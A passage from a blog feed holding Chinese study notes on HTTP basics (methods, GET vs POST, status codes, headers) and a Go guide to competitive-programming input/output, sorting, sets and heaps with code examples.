    <content type="html"><![CDATA[<h1 id="http总结一">HTTP总结(一)</h1><p>在Web应用中，服务器把网页传给浏览器，实际上就是把网页的HTML代码发送给浏览器，让浏览器显示出来。而浏览器和服务器之间的传输协议是HTTP。可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。</p><h3 id="为什么需要http">为什么需要HTTP</h3><p>正如HTTP叫做<strong>超</strong>文本传输协议，大家都知道咱们的欲望是不能够很轻易的被满足的。有了网络之后，大家就发现文本已经没有办法满足我们大家对于传输的这样的一个需求了，那逐渐的我们就有了一些图片、音乐以及视频，甚至说还有一些超链接这样的一个需求，那这些资源他们针对是我们的Text，是一个扩充，所以说它叫做HyperTypes，也就是超文本。那传输这种资源的协议，我们就把它叫做HyperType Transfer Protocol了。</p><p>那在有了明确的边界之后，其实我们大家也能够想到，我们需要用元数据进行一个信息的描述，用来去描述这个信息它是什么类型的，就包括说我们刚刚看到的一些图片、音视频以及超链接这些东西，那这样之后我们就可以把这些东西就是具体的内容塞到一个它消息对应的地方。下面就详细介绍HTTP中关于元数据的一些细节。</p><h3 id="http请求方法">HTTP请求方法</h3><p>RESTful API这个词大概多多少少有所耳闻。RESTful(REST isREpresentational StateTransfer)是目前最流行的接口设计规范，在很多公司有着广泛的应用。RESTful最核心的特点是<strong>URL定位资源，用HTTP动词（GET,POST,DELETE,DETC等）描述操作。</strong>因此理解HTTP请求方法中原本的含义，有利于我们更好的理解资源管理的操作，设计良好的接口。</p><table><thead><tr class="header"><th style="text-align: center;">方法</th><th style="text-align: center;">描述</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">GET</td><td style="text-align: center;">请求指定的页面信息，并返回具体内容，通常只用于读取数据。</td></tr><tr class="even"><td style="text-align: center;">HEAD</td><td style="text-align: center;">类似于 GET请求，只不过返回的响应中没有具体的内容，用于获取报头。</td></tr><tr class="odd"><td style="text-align: center;">POST</td><td style="text-align: center;">向指定资源提交数据进行处理请求（例如提交表单或者上传文件），数据被包含在请求体中。</td></tr><tr class="even"><td style="text-align: center;">PUT</td><td style="text-align: center;">替换指定的资源，没有的话就新增。</td></tr><tr class="odd"><td style="text-align: center;">DELETE</td><td style="text-align: center;">请求服务器删除 URL 标识的资源数据。</td></tr><tr class="even"><td style="text-align: center;">CONNECT</td><td style="text-align: center;">将服务器作为代理，让服务器代替用户进行访问。</td></tr><tr class="odd"><td style="text-align: center;">OPTIONS</td><td style="text-align: center;">向服务器发送该方法，会返回对指定资源所支持的HTTP 请求方法。</td></tr><tr class="even"><td style="text-align: center;">PATCH</td><td style="text-align: center;">对 PUT方法的补充，用来对已知资源进行局部更新。</td></tr><tr class="odd"><td style="text-align: center;">TRACE</td><td style="text-align: center;">回显服务器收到的请求数据，即服务器返回自己收到的数据，主要用于测试和诊断。</td></tr></tbody></table><p>GET和POST大概是我们最常见到的请求方法了。下面对其区别进行深入探讨。</p><h4 id="参数位置">参数位置</h4><p>我们对其最直观的感受，GET经常用来请求页面，参数放到<code>url</code>的<code>path</code>里，而POST经常用来提交表单，参数放到<code>body</code>里。实际上这只是习惯的用法，从协议本身看，并没有什么限制说GET一定不能没有<code>body</code>，POST就一定不能把参放到<code>&lt;URL&gt;</code>的<code>querystring</code>上。因此其实可以更加自由的去利用格式。比如<code>Elastic Search</code>的<code>_search api</code>就用了带<code>body</code>的GET；也可以自己开发接口让POST一半的参数放在<code>url</code>的<code>querystring</code>里，另外一半放<code>body</code>里；你甚至还可以让所有的参数都放Header里——可以做各种各样的定制，只要请求的客户端和服务器端能够约定好。如果用过Postman的话，也能感受到其实不管是什么方法都能自由的把数据填到任何位置(所以也会经常填错(笑))</p><p>另外，我们也知道url是有长度限制的。其实url本身并没有对长度进行限制，但是浏览器会对 url 进行限制，比如 FireFox 限制url 的最大长度为 65536 个字符，也就是 64KB的大小，而 Chrome 限制 url最大长度为 8182个字符，也就是 8 KB的大小。因此，url只要某个要开发的资源/api的URL长度特别长，就推荐使用body来传输数据，除非有特殊情况。因为过长的url即使忽略浏览器本身的限制，也不利于后续的项目维护，不利于搜索引擎的爬取等。</p><h4 id="安全性">安全性</h4><p>我们常听到GET不如POST安全，因为POST用body传输数据，而GET用url传输，更加容易看到。但是从攻击的角度，无论是GET还是POST都不够安全，因为HTTP本身是<strong>明文协议</strong>。<strong>每个HTTP请求和返回的每个byte都会在网络上明文传播，不管是url，header还是body</strong>。这完全不是一个“是否容易在浏览器地址栏上看到“的问题。</p><p>为了避免传输中数据被窃取，必须做从客户端到服务器的端端加密。业界的通行做法就是<strong>https</strong>——即用SSL协议协商出的密钥加密明文的http数据。这个加密的协议和HTTP协议本身相互独立。如果是利用HTTP开发公网的站点/App，要保证安全，https是最最基本的要求。</p><p>回到HTTP本身，的确GET请求的参数更倾向于放在<code>url</code>上，因此有更多机会被泄漏。比如携带私密信息的url会展示在地址栏上，还可以分享给第三方，就非常不安全了。此外，从客户端到服务器端，有大量的中间节点，包括网关，代理等。他们的accesslog通常会输出完整的<code>url</code>，比如nginx的默认accesslog就是如此。如果url上携带敏感数据，就会被记录下来。但请注意<strong>，就算私密数据在body里，也是可以被记录下来的</strong>。</p><p>当然，对于重要的数据，也可以在POST的body中再次对数据加密，对于GET的请求参数也可以采用一些方式进行处理，比如短<code>url</code>生成等，使链接便于传播(当然这解决不了安全问题)。但是最本质的安全策略还是HTTPS。另外，网络安全也是个非常深的话题，在这里单独拎出来讨论GET和POST的安全性问题，其实意义不是很大。</p><h3 id="http状态码">HTTP状态码</h3><table><thead><tr class="header"><th style="text-align: center;">状态码</th><th style="text-align: center;">类别</th><th style="text-align: center;">含义</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(100 \sim199\)</span></td><td style="text-align: center;">信息性状态码</td><td style="text-align: center;">接收的请求正在处理</td></tr><tr class="even"><td style="text-align: center;"><span class="math inline">\(200 \sim299\)</span></td><td style="text-align: center;">成功状态码</td><td style="text-align: center;">请求正常处理完毕</td></tr><tr class="odd"><td style="text-align: center;"><span class="math inline">\(300 \sim399\)</span></td><td style="text-align: center;">重定向状态码</td><td style="text-align: center;">使用替代位置来访问</td></tr><tr class="even"><td style="text-align: center;"><span class="math inline">\(400 \sim499\)</span></td><td style="text-align: center;">客户端错误状态码</td><td style="text-align: center;">服务器无法处理请求</td></tr></tbody></table><p>比较常见的状态码：</p><p>200：成功返回响应</p><p>301：永久重定向，客户端第一次访问此 url时，告知客户端以后直接访问新的 url，该状态保存在浏览器缓存中。</p><p>302；临时重定向，客户端每次访问此 url 时，告知客户端重定向到新的 url，后续访问依然访问当前的 url。</p><p>400：发送的请求错误，请求格式错误，或者没有服务器要求的数据。</p><p>401：没有权限访问，当前用户没有权限访问此资源。</p><p>403: 请求被服务器禁止。</p><p>404：请求的 url 不存在，一般是 url 出错。</p><p>500： 服务器处理请求出现错误。</p><p>501：服务器超出能力之外的方法，例如：请求的方法服务器不支持。</p><p>504：来自网关或者代理服务器，请求资源服务器时超时。</p><h3 id="http首部">HTTP首部</h3><p>http 主要有 4种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。</p><p>除此之外，还有一种扩展首部，这种首部还未添加的 http标准中去。在一些大型互联网公司内部，开发者需要特定的扩展首部来实现特殊的功能。</p><div class="code-wrapper"><pre><code class="hljs">通用首部字段：请求和响应都可以使用的首部，与报文相关的最基本的信息。请求首部字段：仅在请求中使用的首部。响应首部字段：仅在响应中使用的首部。实体首部字段：用于应对实体部分的首部，一般是对实体内容进行说明。</code></pre></div><p>在后面更加具体的讲HTTP发展过程中新增的特性时，会对这些首部进行详细的讲解。</p><h3 id="总结">总结</h3><p>在这一部分，对请求和响应的最基本的内容进行介绍，特别是关于请求方法和状态码中的一些细节在面试和实际工作中有必要进行熟悉。事实上这一部分也只是做一个铺垫，对HTTP协议的基础知识做一个简单的回顾。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 刷题快速入门</title>
    <link href="/posts/41936/"/>
    <url>/posts/41936/</url>
    
    <content type="html"><![CDATA[<h1 id="go-刷题快速入门">Go 刷题快速入门</h1><p>这篇文章讲述使用Golang刷题时遇到的关于输入输出和数据结构的常见问题，并在必要时进行相关知识点的讲解，方便刚入门Go进行刷题实践时进行查阅和学习理解。</p><h2 id="输入输出">输入输出</h2><p>如果是在力扣这类核心代码模式的平台，就和写其他语言一样，不需要去关心输入输出的模式。但当下大部分公司的笔试算法题都是采用的ACM模式。因此若希望在笔试中展现自己的Golang编程能力，还是需要熟悉常见的输入输出格式。</p><h3 id="读整数">读整数</h3><p>这里我们以<code>a+b</code>为例说明。</p><h4 id="每行数字固定">每行数字固定</h4><blockquote><p>输入描述: 输入包括两个正整数 a,b(1 &lt;= a, b &lt;=1000),输入数据包括多组。</p><p>输出描述: 输出a+b的结果</p><p>输入例子1: 1 5 10 20</p><p>输出例子1: 6 30</p></blockquote><p>最简单的情况。<code>fmt.Scan</code>返回成功读取的item数以及<code>err</code>。这里由于仅仅是算法示例题目，为了方便忽略了错误处理。当然用<code>fmt.Scanln</code>也是可以的。</p><p>Scan从标准输入扫描文本，读取由空白符分隔的值保存到传递给本函数的参数中，换行符视为空白符。本函数返回成功扫描的数据个数和遇到的任何错误。如果读取的数据个数比提供的参数少，会返回一个错误报告原因。</p><p>而Scanln遇到换行才停止扫描。最后一个数据后面必须有换行或者到达结束位置。返回值和Scan含义一样。</p><p>下面给出示例代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tdsxaqlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-tdsxaqlluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">"fmt"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {    a := <span class="hljs-number">0</span>    b := <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> {        n, _ := fmt.Scan(&amp;a, &amp;b)        <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> {            <span class="hljs-keyword">break</span>        } <span class="hljs-keyword">else</span> {            fmt.Printf(<span class="hljs-string">"%d\n"</span>, a + b)        }    }}</code></pre></div></div><h4 id="每行数字不固定但知道数量">每行数字不固定，但知道数量</h4><blockquote><p>输入描述: 输入数据有多组, 每行表示一组输入数据。每行的第一个整数为整数的个数n(1 &lt;= n &lt;= 100)。 接下来n个正整数,即需要求和的每个正整数。</p><p>输出描述: 每组数据输出求和的结果</p><p>输入例子1: 4 1 2 3 4 5 1 2 3 4 5</p><p>输出例子1: 10 15</p></blockquote><p>同样的道理，不赘述。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-o9bge8lluxp18z"></i><span>go</span><div class="collapse show" id="collapse-o9bge8lluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span>(    <span class="hljs-string">"fmt"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{    <span class="hljs-keyword">var</span> t,crr,sum <span class="hljs-type">int</span>    <span class="hljs-keyword">for</span> {        n,_ := fmt.Scan(&amp;t)        <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>{            <span class="hljs-keyword">break</span>        }<span class="hljs-keyword">else</span>{            sum = <span class="hljs-number">0</span>            <span class="hljs-keyword">for</span> i:=<span class="hljs-number">0</span>;i&lt;t;i++{                fmt.Scan(&amp;crr)                sum += crr            }            fmt.Println(sum)        }    }    }</code></pre></div></div><h4 id="每行数字不固定也不知道数量">每行数字不固定，也不知道数量</h4><p>这个时候我们需要一整行一整行地读，这时需要用到bufio包，还是需要格外记忆一下。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-52pjjglluxp18z"></i><span>go</span><div class="collapse show" id="collapse-52pjjglluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">"bufio"</span>    <span class="hljs-string">"fmt"</span>    <span class="hljs-string">"os"</span>    <span class="hljs-string">"strconv"</span>    <span class="hljs-string">"strings"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {    inputs := bufio.NewScanner(os.Stdin)    <span class="hljs-keyword">for</span> inputs.Scan() {  <span class="hljs-comment">//每次读入一行</span>        data := strings.Split(inputs.Text(), <span class="hljs-string">" "</span>)  <span class="hljs-comment">//通过空格将他们分割，并存入一个字符串切片</span>        <span class="hljs-keyword">var</span> sum <span class="hljs-type">int</span>        <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> data {            num, _ := strconv.Atoi(data[i])   <span class="hljs-comment">//将字符串转换为int</span>            sum += num        }        fmt.Println(sum)    }}</code></pre></div></div><p>补充一个C++的实现，用到了<code>stringstream</code>。</p><p>另外需要提醒的是，<code>stringstream</code>构造函数会特别消耗内存，似乎不打算主动释放内存(或许是为了提高效率)，但如果你要在程序中用同一个流，反复读写大量的数据，将会造成大量的内存消耗，因些这时候，需要适时地清除一下缓冲(用 stream.str("") ，需要注意clear()仅仅清空标志位，并没有释放内存)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tx34a3lluxp18z"></i><span>C++</span><div class="collapse show" id="collapse-tx34a3lluxp18z"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    std::string line;    <span class="hljs-keyword">while</span> (std::<span class="hljs-built_in">getline</span>(std::cin, line)) {        <span class="hljs-function">std::istringstream <span class="hljs-title">iss</span><span class="hljs-params">(line)</span></span>;        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;        <span class="hljs-type">int</span> num;        <span class="hljs-keyword">while</span> (iss &gt;&gt; num) {            sum += num;        }        std::cout &lt;&lt; sum &lt;&lt; std::endl;    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><h3 id="读字符串">读字符串</h3><blockquote><p>输入描述: 多个测试用例，每个测试用例一行。</p><p>每行通过空格隔开，有n个字符，n＜100</p><p>输出描述:对于每组测试用例，输出一行排序过的字符串，每个字符串通过空格隔开</p><p>输入例子1: a c bb f dddd nowcoder</p><p>输出例子1: a bb c dddd f nowcoder</p></blockquote><p>排序是我们算法设计中频繁使用的操作，因此在这里也捎带进行讲解和记录。</p><p>Go语言的 sort.Sort函数不会对具体的序列和它的元素做任何假设。相反，它使用了一个接口类型sort.Interface来指定通用的排序算法和可能被排序到的序列类型之间的约定。这个接口的实现由序列的具体表示和它希望排序的元素决定，序列的表示经常是一个切片。</p><p>根据直觉，排序算法需要知道三个东西：序列的长度，表示两个元素比较的结果，一种交换两个元素的方式。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3glzj0lluxp18z"></i><span>go</span><div class="collapse show" id="collapse-3glzj0lluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">package</span> sort<span class="hljs-keyword">type</span> Interface <span class="hljs-keyword">interface</span> {    Len() <span class="hljs-type">int</span>            <span class="hljs-comment">// 获取元素数量</span>    Less(i, j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span> <span class="hljs-comment">// i，j是序列元素的指数。</span>    Swap(i, j <span class="hljs-type">int</span>)        <span class="hljs-comment">// 交换元素</span>}</code></pre></div></div><p>为了对序列进行排序，我们需要定义一个实现了这三个方法的类型，然后对这个类型的一个实例应用sort.Sort 函数。</p><p>我们可以像任何其他语言一样灵活的自定义排序规则。但大部分情况中，只需要对字符串、整型等进行快速排序。根据优化热点行为的原则，Golang对Go语言中提供了一些固定模式的封装以方便开发者迅速对内容进行排序。因此在这个题目中我们可以简单的调用<code>sort.Strings</code>按字典序进行排序。同时，像C++一样，我们可以自定义排序函数，使其倒序排列：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bm3go0lluxp18z"></i><span>go</span><div class="collapse show" id="collapse-bm3go0lluxp18z"><pre><code class="hljs go">sort.Slice(a,<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i,j <span class="hljs-type">int</span>)</span></span><span class="hljs-type">bool</span>{<span class="hljs-keyword">return</span> a[i]&gt;a[j] })</code></pre></div></div><p><code>strings.Join</code>将切片连接成字符串。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8f4cywlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-8f4cywlluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (    <span class="hljs-string">"fmt"</span>    <span class="hljs-string">"bufio"</span>    <span class="hljs-string">"os"</span>    <span class="hljs-string">"strings"</span>    <span class="hljs-string">"sort"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{    input := bufio.NewScanner(os.Stdin)    <span class="hljs-keyword">for</span> input.Scan(){        data := strings.Split(input.Text(),<span class="hljs-string">" "</span>)        sort.Strings(data)        fmt.Println(strings.Join(data, <span class="hljs-string">" "</span>))}}</code></pre></div></div><h2 id="数据结构">数据结构</h2><h3 id="线性容器">线性容器</h3><p>Golang内置的切片以及其方便的操作，可以满足我们使用向量，栈和队列等需求。比如以经典的考察栈的运用的<a href="https://leetcode.cn/problems/valid-parentheses/">有效的括号</a>为例：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7som5nlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-7som5nlluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isValid</span><span class="hljs-params">(s <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> {    n := <span class="hljs-built_in">len</span>(s)    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> {        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>    }    pairs := <span class="hljs-keyword">map</span>[<span class="hljs-type">byte</span>]<span class="hljs-type">byte</span>{        <span class="hljs-string">')'</span>: <span class="hljs-string">'('</span>,        <span class="hljs-string">']'</span>: <span class="hljs-string">'['</span>,        <span class="hljs-string">'}'</span>: <span class="hljs-string">'{'</span>,    }    stack := []<span class="hljs-type">byte</span>{}    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; n; i++ {        <span class="hljs-keyword">if</span> pairs[s[i]] &gt; <span class="hljs-number">0</span> {            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(stack) == <span class="hljs-number">0</span> || stack[<span class="hljs-built_in">len</span>(stack)<span class="hljs-number">-1</span>] != pairs[s[i]] {                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>            }            stack = stack[:<span class="hljs-built_in">len</span>(stack)<span class="hljs-number">-1</span>]        } <span class="hljs-keyword">else</span> {            stack = <span class="hljs-built_in">append</span>(stack, s[i])        }    }    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(stack) == <span class="hljs-number">0</span>}</code></pre></div></div><h3 id="映射">映射</h3><p>Golang中的<code>map</code>对应于C++中的<code>unordered_map</code>。下面主要讲述怎么使用<code>map</code>实现<code>set</code>和可排序的<code>map</code>。</p><p><code>map</code>的 key 肯定是唯一的，而这恰好与 set的特性一致，天然保证 set 中成员的唯一性。而且通过 map 实现set，在检查是否存在某个元素时可直接使用<code>_, ok := m[key]</code>的语法，效率高。</p><p>先来看一个简单的实现，如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bwdqn9lluxp18z"></i><span>go</span><div class="collapse show" id="collapse-bwdqn9lluxp18z"><pre><code class="hljs go">set := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>) <span class="hljs-comment">// New empty set</span>set[<span class="hljs-string">"Foo"</span>] = <span class="hljs-literal">true</span>            <span class="hljs-comment">// Add</span><span class="hljs-keyword">for</span> k := <span class="hljs-keyword">range</span> set {         <span class="hljs-comment">// Loop</span>    fmt.Println(k)}<span class="hljs-built_in">delete</span>(set, <span class="hljs-string">"Foo"</span>)    <span class="hljs-comment">// Delete</span>size := <span class="hljs-built_in">len</span>(set)      <span class="hljs-comment">// Size</span>exists := set[<span class="hljs-string">"Foo"</span>]  <span class="hljs-comment">// Membership</span></code></pre></div></div><p>通过创建<code>map[string]bool</code>来存储<code>string</code>的集合，比较容易理解。而且判断元素是否存在可以很简单的写成<code>if set["foo"]</code>，一般做算法题的时候已经足够了，简单快捷。</p><p>但这里还有个问题，<code>map</code> 的 <code>value</code>是布尔类型，这会导致 set 多占一定内存空间，而 <code>set</code>不该有这个问题。如果我们对占用空间有要求，可以考虑利用空结构体。</p><p>在 Go 中，空结构体不占任何内存。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7xf4oflluxp18z"></i><span>go</span><div class="collapse show" id="collapse-7xf4oflluxp18z"><pre><code class="hljs go">unsafe.Sizeof(<span class="hljs-keyword">struct</span>{}{}) <span class="hljs-comment">// 结果为 0</span></code></pre></div></div><p>因此可以实现如下例所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tekmp0lluxp18z"></i><span>go</span><div class="collapse show" id="collapse-tekmp0lluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {set := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>{}{<span class="hljs-string">"pm"</span>: {},<span class="hljs-string">"fe"</span>: {},<span class="hljs-string">"rd"</span>: {},}<span class="hljs-keyword">if</span> v, ok := set[<span class="hljs-string">"rd"</span>]; ok {fmt.Println(<span class="hljs-string">"exist"</span>)fmt.Println(<span class="hljs-string">"size:"</span>, unsafe.Sizeof(v))} <span class="hljs-keyword">else</span> {fmt.Println(<span class="hljs-string">"not exist"</span>)}}</code></pre></div></div><h3 id="堆">堆</h3><p>Go的标准包<code>Container</code>中包含了常用的容器类型,包括<code>conatiner/List</code>,<code>container/heap</code>,<code>container/ring</code>。关于双向链表和环形链表，虽然在实际工作中也会经常用到，但在力扣中通常会给出链表的结构体，其他链表的操作和功能需要我们自己去实现；而ACM题目为了方便程序调试常常使用向量模拟链表，鉴于篇幅有限不在此详细讲解，也可以参阅<a href="https://juejin.cn/post/7042729165400834056">这篇文章</a>进行更深入的了解。在此主要总结一下堆的实现和使用。</p><p>首先若是ACM模式，需要导包：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xq65ldlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-xq65ldlluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">"container/heap"</span><span class="hljs-string">"fmt"</span>)</code></pre></div></div><p>我们要使用go标准库给我们提供的heap，那么必须自己实现这些接口定义的方法，需要实现的方法如下：</p><ul><li>Len() int</li><li>Less(i, j int) bool</li><li>Swap(i, j int)</li><li>Push(x interface{})</li><li>Pop() interface{}</li></ul><p>实现了这五个方法的数据类型才能使用go标准库给我们提供的heap，下面简单示例为定义一个IntHeap类型，并实现上面五个方法。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3eijwxlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-3eijwxlluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">type</span> IntHeap []<span class="hljs-type">int</span>  <span class="hljs-comment">// 定义一个类型</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IntHeap)</span></span> Len() <span class="hljs-type">int</span> { <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(h) }  <span class="hljs-comment">// 绑定len方法,返回长度</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IntHeap)</span></span> Less(i, j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span> {  <span class="hljs-comment">// 绑定less方法</span><span class="hljs-keyword">return</span> h[i] &lt; h[j]  <span class="hljs-comment">// 如果h[i]&lt;h[j]生成的就是小根堆，如果h[i]&gt;h[j]生成的就是大根堆</span>}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IntHeap)</span></span> Swap(i, j <span class="hljs-type">int</span>) {  <span class="hljs-comment">// 绑定swap方法，交换两个元素位置</span>h[i], h[j] = h[j], h[i]}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *IntHeap)</span></span> Pop() <span class="hljs-keyword">interface</span>{} {  <span class="hljs-comment">// 绑定pop方法，从最后拿出一个元素并返回</span>old := *hn := <span class="hljs-built_in">len</span>(old)x := old[n<span class="hljs-number">-1</span>]*h = old[<span class="hljs-number">0</span> : n<span class="hljs-number">-1</span>]<span class="hljs-keyword">return</span> x}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *IntHeap)</span></span> Push(x <span class="hljs-keyword">interface</span>{}) {  <span class="hljs-comment">// 绑定push方法，插入新元素</span>*h = <span class="hljs-built_in">append</span>(*h, x.(<span class="hljs-type">int</span>))}</code></pre></div></div><p>我们可以借此通过<a href="https://leetcode.cn/problems/top-k-frequent-elements/description">前k个高频元素</a>进行练习。当然这道题目更好的方法是采用快速划分的思想。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pwncxwlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-pwncxwlluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">topKFrequent</span><span class="hljs-params">(nums []<span class="hljs-type">int</span>, k <span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">int</span> {    occ:=<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>{}    <span class="hljs-keyword">for</span> _,num:=<span class="hljs-keyword">range</span> nums{        occ[num]++    }    h:=&amp;IHeap{}    heap.Init(h)    <span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> occ{        heap.Push(h, [<span class="hljs-number">2</span>]<span class="hljs-type">int</span>{key, value})        <span class="hljs-keyword">if</span> h.Len() &gt; k {            heap.Pop(h)        }    }    ret := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, k)    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; k; i++ {        ret[k - i - <span class="hljs-number">1</span>] = heap.Pop(h).([<span class="hljs-number">2</span>]<span class="hljs-type">int</span>)[<span class="hljs-number">0</span>]    }    <span class="hljs-keyword">return</span> ret}<span class="hljs-keyword">type</span> IHeap[][<span class="hljs-number">2</span>]<span class="hljs-type">int</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IHeap)</span></span> Len() <span class="hljs-type">int</span>{    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(h)}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IHeap)</span></span> Less(i,j <span class="hljs-type">int</span>) <span class="hljs-type">bool</span>{    <span class="hljs-keyword">return</span> h[i][<span class="hljs-number">1</span>]&lt;h[j][<span class="hljs-number">1</span>]}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h IHeap)</span></span> Swap(i, j <span class="hljs-type">int</span>){     h[i], h[j] = h[j], h[i] }<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *IHeap)</span></span> Push(x <span class="hljs-keyword">interface</span>{}) {    *h = <span class="hljs-built_in">append</span>(*h, x.([<span class="hljs-number">2</span>]<span class="hljs-type">int</span>))}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(h *IHeap)</span></span> Pop() <span class="hljs-keyword">interface</span>{} {    old := *h    n := <span class="hljs-built_in">len</span>(old)    x := old[n<span class="hljs-number">-1</span>]    *h = old[<span class="hljs-number">0</span> : n<span class="hljs-number">-1</span>]    <span class="hljs-keyword">return</span> x}</code></pre></div></div><h3 id="总结">总结</h3><p>这篇文章仅仅是非常浅的总结了Go在算法题目中常用的接口和数据结构，很多地方总结的还不到位，更多知识点还是需要多刷题多实践。当然，从最常用的数据结构和接口中也能体会出很多Go语言的设计思想。尽管有喜闻乐见的手写<code>max</code>函数，但作为一门结合了Python的简洁与C++的严谨和性能的语言，还是很值得我们去学习的，也希望能够渐入佳境，成为训练有素的Gopher。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 高质量编程实践</title>
    <link href="/posts/2118/"/>
    <url>/posts/2118/</url>
    
